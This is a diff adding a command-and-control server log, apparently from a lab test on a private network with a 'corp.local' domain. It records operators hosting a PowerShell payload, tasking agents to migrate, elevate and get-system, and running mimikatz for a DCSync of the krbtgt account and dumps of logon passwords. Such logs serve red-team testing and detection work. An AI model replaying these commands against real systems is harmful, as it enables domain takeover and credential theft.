@@ -1,0 +1,49 @@
+31/05/2023 02:46:34 | Info | User | Fropops-8804bea9-92ba-426b-b3ff-9ffc69e3d17d |  | Connexion to TeamServer
+31/05/2023 02:46:35 | Info | User | Fropops-8804bea9-92ba-426b-b3ff-9ffc69e3d17d |  | Connexion to TeamServer
+31/05/2023 02:47:37 | Info | User | Fropops-8804bea9-92ba-426b-b3ff-9ffc69e3d17d |  | Web hosting a - Payload PowerShell x64 https://192.168.56.129:443
+31/05/2023 02:50:52 | Info | Agent | 29b26a076a |  | Agent Checking In
+31/05/2023 02:51:10 | Info | User | Fropops-8804bea9-92ba-426b-b3ff-9ffc69e3d17d | 29b26a076a | Command tasked to agent : terminate
+31/05/2023 02:52:07 | Info | Agent | 49d0ff2160 |  | Agent Checking In
+31/05/2023 02:53:14 | Info | User | Fropops-8804bea9-92ba-426b-b3ff-9ffc69e3d17d | 49d0ff2160 | Command tasked to agent : migrate
+31/05/2023 02:53:26 | Info | Agent | 70bb038535 |  | Agent Checking In
+31/05/2023 02:54:21 | Info | User | Fropops-8804bea9-92ba-426b-b3ff-9ffc69e3d17d | 70bb038535 | Command tasked to agent : elevate -i
+31/05/2023 02:54:36 | Info | Agent | 676152bde6 |  | Agent Checking In
+31/05/2023 02:54:36 | Info | Agent | 60e6ad6455 |  | Agent Checking In
+31/05/2023 02:54:36 | Info | Agent | dbfc80ba1e |  | Agent Checking In
+31/05/2023 02:54:36 | Info | Agent | 2f7b69618d |  | Agent Checking In
+31/05/2023 02:54:36 | Info | Agent | 2c8855fca6 |  | Agent Checking In
+31/05/2023 02:55:04 | Info | Agent | 49d0ff2160 |  | Agent Checking In
+31/05/2023 02:55:04 | Info | Agent | 2f7b69618d |  | Agent Checking In
+31/05/2023 02:55:04 | Info | Agent | 2c8855fca6 |  | Agent Checking In
+31/05/2023 02:55:04 | Info | Agent | 60e6ad6455 |  | Agent Checking In
+31/05/2023 02:55:04 | Info | Agent | 676152bde6 |  | Agent Checking In
+31/05/2023 02:55:04 | Info | Agent | dbfc80ba1e |  | Agent Checking In
+31/05/2023 02:55:04 | Info | Agent | 70bb038535 |  | Agent Checking In
+31/05/2023 02:55:04 | Info | Agent | 3dbcd399f2 |  | Agent Checking In
+31/05/2023 02:55:26 | Info | Agent | 49d0ff2160 |  | Agent Checking In
+31/05/2023 02:55:27 | Info | Agent | 70bb038535 |  | Agent Checking In
+31/05/2023 02:55:27 | Info | Agent | 3dbcd399f2 |  | Agent Checking In
+31/05/2023 02:55:58 | Info | User | Fropops-8804bea9-92ba-426b-b3ff-9ffc69e3d17d | 3dbcd399f2 | Command tasked to agent : get-system -i
+31/05/2023 02:56:07 | Info | Agent | ffac0b28b5 |  | Agent Checking In
+31/05/2023 02:56:07 | Info | Agent | 2c8855fca6 |  | Agent Checking In
+31/05/2023 02:56:07 | Info | Agent | 60e6ad6455 |  | Agent Checking In
+31/05/2023 02:56:09 | Info | Agent | 2f7b69618d |  | Agent Checking In
+31/05/2023 02:56:09 | Info | Agent | 676152bde6 |  | Agent Checking In
+31/05/2023 02:56:09 | Info | Agent | dbfc80ba1e |  | Agent Checking In
+31/05/2023 02:57:10 | Info | Agent | 449ed98b44 |  | Agent Checking In
+31/05/2023 02:58:27 | Info | User | Fropops-8804bea9-92ba-426b-b3ff-9ffc69e3d17d | 2f7b69618d | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt@corp.local" exit
+31/05/2023 02:59:48 | Info | User | Fropops-8804bea9-92ba-426b-b3ff-9ffc69e3d17d | 2f7b69618d | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt@corp.local" exit
+31/05/2023 03:00:58 | Info | Agent | 938fdc3b83 |  | Agent Checking In
+31/05/2023 03:02:20 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e |  | Connexion to TeamServer
+31/05/2023 03:02:21 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e |  | Connexion to TeamServer
+31/05/2023 03:03:58 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e |  | Web hosting a - Payload PowerShell x64 https://192.168.56.129:443
+31/05/2023 03:05:31 | Info | Agent | ddc7d3f370 |  | Agent Checking In
+31/05/2023 03:06:23 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | ddc7d3f370 | Command tasked to agent : sleep 0
+31/05/2023 03:06:38 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | ddc7d3f370 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe coffee exit
+31/05/2023 03:06:44 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | ddc7d3f370 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe coffee exit
+31/05/2023 03:06:55 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | ddc7d3f370 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt@corp.local" exit
+31/05/2023 03:06:58 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | ddc7d3f370 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "lsadump::dcsync /domain:corp.local /user:krbtgt@corp.local" exit
+31/05/2023 03:07:21 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | ddc7d3f370 | Command tasked to agent : get-system -i
+31/05/2023 03:08:27 | Info | Agent | e1f27711b1 |  | Agent Checking In
+31/05/2023 03:09:00 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | e1f27711b1 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::logonpasswords" exit
+31/05/2023 03:09:04 | Info | User | Fropops-3ece053e-9070-44b3-a2ed-d79180ce689e | e1f27711b1 | Command tasked to agent : execute-pe /mnt/Share/Utils/win/programs/mimikatz64.exe "sekurlsa::logonpasswords" exit
